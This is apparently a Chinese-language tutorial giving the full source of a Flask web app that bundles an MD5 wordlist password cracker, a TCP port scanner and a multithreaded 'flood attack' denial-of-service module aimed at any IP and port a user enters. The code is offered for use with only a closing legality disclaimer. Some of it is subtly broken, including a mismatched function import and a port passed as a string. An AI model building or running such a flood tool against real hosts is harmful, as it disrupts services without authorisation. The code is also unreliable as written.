项目网站地址：http://www.jsdhacker.top:8000
项目结构：

```plain
flask_security_tools/
│
├── app.py               # Flask应用主文件
├── templates/
│   ├── index.html       # 首页模板
│   ├── password_crack.html  # 密码爆破模块界面
│   ├── port_scan.html   # 端口扫描模块界面
│   ├── flood_attack.html  # 泛洪攻击模块界面
│
├── static/
│   └── style.css        # 样式文件
│
└── utils/
    ├── password_crack.py  # 密码爆破工具
    ├── port_scan.py       # 端口扫描工具
    └── flood_attack.py    # 泛洪攻击工具
```

### 1. `app.py` - Flask应用主文件

```python
from flask import Flask, render_template, request
from utils.password_crack import crack_password
from utils.port_scan import scan_ports
from utils.flood_attack import start_flood_attack

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/password_crack', methods=['GET', 'POST'])
def password_crack_view():
    if request.method == 'POST':
        password_file = request.form['password_file']
        target_hash = request.form['target_hash']
        result = crack_password(password_file, target_hash)
        return render_template('password_crack.html', result=result)
    return render_template('password_crack.html')

@app.route('/port_scan', methods=['GET', 'POST'])
def port_scan_view():
    if request.method == 'POST':
        target_ip = request.form['target_ip']
        result = scan_ports(target_ip)
        return render_template('port_scan.html', result=result)
    return render_template('port_scan.html')

@app.route('/flood_attack', methods=['GET', 'POST'])
def flood_attack_view():
    if request.method == 'POST':
        target_ip = request.form['target_ip']
        target_port = request.form['target_port']
        duration = int(request.form['duration'])
        result = start_flood_attack(target_ip, target_port, duration)
        return render_template('flood_attack.html', result=result)
    return render_template('flood_attack.html')

if __name__ == '__main__':
    app.run(debug=True)
```

### 2. `templates/index.html` - 首页模板

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Tools</title>

    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>

<body>
    <h1>Welcome to the Security Tools Web App</h1>

    <nav>
        <ul>
            <li><a href="{{ url_for('password_crack_view') }}">Password Cracking</a></li>

            <li><a href="{{ url_for('port_scan_view') }}">Port Scan</a></li>

            <li><a href="{{ url_for('flood_attack_view') }}">Flood Attack</a></li>

        </ul>

    </nav>

</body>

</html>

```

### 3. `templates/password_crack.html` - 密码爆破模块界面

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Cracking</title>

</head>

<body>
    <h1>Password Cracking</h1>

    <form method="POST">
        <label for="password_file">Password File:</label>

        <input type="file" name="password_file" required><br>
        <label for="target_hash">Target Hash:</label>

        <input type="text" name="target_hash" required><br>
        <button type="submit">Crack Password</button>

    </form>

    {% if result %}
    <h2>Result: {{ result }}</h2>

    {% endif %}
</body>

</html>

```

### 4. `utils/password_crack.py` - 密码爆破工具实现

```python
import hashlib

def crack_password(password_file, target_hash):
    try:
        with open(password_file, 'r') as file:
            for line in file:
                password = line.strip()
                if hashlib.md5(password.encode()).hexdigest() == target_hash:
                    return f'Password found: {password}'
        return 'Password not found'
    except Exception as e:
        return f'Error: {str(e)}'
```

### 5. `templates/port_scan.html` - 端口扫描模块界面

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Port Scan</title>

</head>

<body>
    <h1>Port Scan</h1>

    <form method="POST">
        <label for="target_ip">Target IP:</label>

        <input type="text" name="target_ip" required><br>
        <button type="submit">Scan Ports</button>

    </form>

    {% if result %}
    <h2>Result:</h2>

    <pre>{{ result }}</pre>

    {% endif %}
</body>

</html>

```

### 6. `utils/port_scan.py` - 端口扫描工具实现

```python
import socket

def scan_ports(target_ip):
    open_ports = []
    for port in range(1, 1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports if open_ports else "No open ports found"
```

### 7. `templates/flood_attack.html` - 泛洪攻击模块界面

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flood Attack</title>

</head>

<body>
    <h1>Flood Attack</h1>

    <form method="POST">
        <label for="target_ip">Target IP:</label>

        <input type="text" name="target_ip" required><br>
        <label for="target_port">Target Port:</label>

        <input type="text" name="target_port" required><br>
        <label for="duration">Duration (seconds):</label>

        <input type="number" name="duration" required><br>
        <button type="submit">Start Attack</button>

    </form>

    {% if result %}
    <h2>Result: {{ result }}</h2>

    {% endif %}
</body>

</html>

```

### 8. `utils/flood_attack.py` - 泛洪攻击工具实现

```python
import socket
import threading
import time

def flood_attack(target_ip, target_port, duration):
    start_time = time.time()
    threads = []

    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        while time.time() - start_time < duration:
            sock.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
        sock.close()

    for _ in range(10):  # Launch 10 threads for the attack
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    return "Attack completed"
```

### 9. `static/style.css` - 样式文件

```css
body {
    font-family: Arial, sans-serif;
}

h1 {
    color: #333;
}

nav ul {
    list-style-type: none;
}

nav ul li {
    display: inline;
    margin-right: 10px;
}

form {
    margin-top: 20px;
}
```

### 使用步骤

1. 安装Flask：

```bash
pip install flask
```

2. 启动Flask应用：

```bash
python app.py
```

3. 访问 `http://127.0.0.1:5000/` 查看网站。

注意：安全工具（如密码爆破、端口扫描、泛洪攻击等）可能涉及合法性问题，请仅在授权的环境下使用。

这个项目只是一个基础的框架，您可以根据实际需求添加更多功能，并提高安全性。



